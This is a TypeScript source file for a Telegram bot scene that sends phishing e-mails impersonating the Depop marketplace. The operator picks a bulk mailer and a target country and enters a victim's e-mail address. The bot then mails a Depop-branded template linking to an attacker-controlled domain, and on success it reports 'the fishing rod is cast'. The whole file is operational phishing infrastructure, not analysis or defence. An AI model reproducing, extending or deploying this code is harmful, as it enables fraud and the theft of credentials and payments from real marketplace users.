import {Context} from "@/database/models/context";
import {Scene} from "grammy-scenes";
import {Composer, InlineKeyboard} from "grammy";
import {adsRepository, domensRepository} from "@/database";
import {deleteAllMessages} from "@/helpers/deleteAllMessages";
import {sendEmailKeshMail, sendEmailYourMailer} from "@/utils/rassilka/email";
import {getDomen} from "@/helpers/getDomen";

export const scene = new Scene<Context>('emailSendDepop')
export const composer = new Composer<Context>()
const regex = /email ad depop (?<id>\d+)/gmi
composer.callbackQuery(regex, handler)

async function handler(ctx: Context)  {
    const match = regex.exec(ctx.callbackQuery.data)
    const id = match.groups.id
    await ctx.scenes.enter('emailSendDepop', {
        id
    })
}

async function cancel(ctx) {
    await deleteAllMessages(ctx.session.deleteMessage, ctx)
    ctx.scene.exit()
}

scene.always().callbackQuery('cancel emailSendDepop', cancel)

scene.do(async (ctx) => {
    ctx.session.smsEmail = {ad: Number(ctx.scene.opts.arg.id), to: undefined, pattern: undefined}
    const ad = await adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    })
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }
    const msg = await ctx.reply("<b>🌳 Выбери мейлера:</b>", {
        reply_markup:  new InlineKeyboard()
            .text('KeshMail', 'keshmail')
            .row()
            .text('YourMailer', 'yourmailer')
            .row()
            .text('Отмена', 'cancel emailSendDepop')
    })
    ctx.session.deleteMessage = [msg.message_id]
    ctx.scene.resume()
})

scene.wait().callbackQuery(/keshmail|yourmailer/,async (ctx) => {
    ctx.session.smsEmail.who = ctx.callbackQuery.data
    try {
        ctx.deleteMessage()
    }catch (e) {}

    if (ctx.callbackQuery.data === 'depa') {
        if (ctx.user.email <= 0) {
            return ctx.answerCallbackQuery({
                show_alert: true,
                text: `🐨 [DEPA] У тебя доступно 0 сообщений`
            })
        }
    }

    const ad = await adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    })
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }

    const msg = await ctx.reply("<b>🪤 Выбери страну:</b>", {
        reply_markup:  new InlineKeyboard()
            .text('🇩🇪 Германия', 'de')
            .row()
            .text('🇬🇧 Великобритания', 'gb')
            .row()
            .text('🇦🇺 Австралия', 'au')
            .row()
            .text('Отмена', 'cancel emailSendDepop')
    })
        //
    ctx.session.deleteMessage = []
    ctx.session.deleteMessage.push(msg.message_id)
    ctx.scene.resume()
})


scene.wait().on('callback_query:data',async (ctx) => {
    ctx.session.smsEmail.country = ctx.callbackQuery.data

    try {
        ctx.deleteMessage()
    }catch (e) {}

    const ad = await adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    })
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }

    const msg = await ctx.reply("<b>📨 Введи e-mail:</b>", {
        reply_markup:  new InlineKeyboard()
            .text('Отмена', 'cancel emailSendFacebook')
    })
    ctx.session.deleteMessage = []
    ctx.session.deleteMessage.push(msg.message_id)
    ctx.scene.resume()
})


scene.wait().on('message:text', async ctx => {
    ctx.session.smsEmail.to = ctx.msg.text
    ctx.session.deleteMessage.push(ctx.msg.message_id)

    const owenerAd = await adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    })
    const ad = await adsRepository.findOne({
        where: {
            originallink: owenerAd.originallink,
            country: ctx.session.smsEmail.country
        }
    })
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }

    if (ad.service.toLowerCase() === 'depop') ctx.session.smsEmail.pattern = "depop_EU@!!@2.0"

    const domen = await getDomen(ctx.user,ad.service)
    if (!domen) {
        await ctx.reply(`domen undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }

    const msg = await ctx.reply(`⏳`)

    if (ctx.session.smsEmail.who === 'yourmailer') {
        const response = await sendEmailYourMailer(
            ctx.session.smsEmail.to,
            ctx.session.smsEmail.pattern,
            `https://${domen.link}/service/depop/${ad.link}?email=${ctx.session.smsEmail.to}&emailowner=${ctx.session.smsEmail.who}`,
            ctx.from.id)
        try {
            ctx.api.deleteMessage(ctx.chat.id,msg.message_id)
        } catch (e) {}

        console.log(response, 'yourmailer')
        await ctx.reply(
            (response === "The message has been sent")
                ? `✅ Удочка закинута`
                : `⚠️ Не удалось отправить письмо`,
            {
                reply_markup: {
                    inline_keyboard: [
                        [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                    ]
                }
            })
    } else if (ctx.session.smsEmail.who === 'keshmail') {
        let service = undefined
        if (ctx.session.smsEmail.service === 'depop' && ctx.session.smsEmail.country === 'de') ctx.session.smsEmail.pattern = "depop.de"
        if (ctx.session.smsEmail.service === 'depop' && ctx.session.smsEmail.country === 'gb') ctx.session.smsEmail.pattern = "depop.co.uk"

        const response = await sendEmailKeshMail(
            String(ctx.from.id),
            String( (ctx.from?.username) ? ctx.from?.username : 'none'),
            ctx.session.smsEmail.to,
            `https://${domen.link}/link/${ad.link}?email=${ctx.session.smsEmail.to}&emailowner=${ctx.session.smsEmail.who}`,
            service,
            ad.date)
        try {
            ctx.api.deleteMessage(ctx.chat.id,msg.message_id)
        } catch (e) {}
        console.log(response, 'keshmail')
        await ctx.reply(
            (response)
                ? `✅ Удочка закинута`
                : `⚠️ Не удалось отправить письмо`,
            {
                reply_markup: {
                    inline_keyboard: [
                        [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                    ]
                }
            })
    }


    return cancel(ctx)
})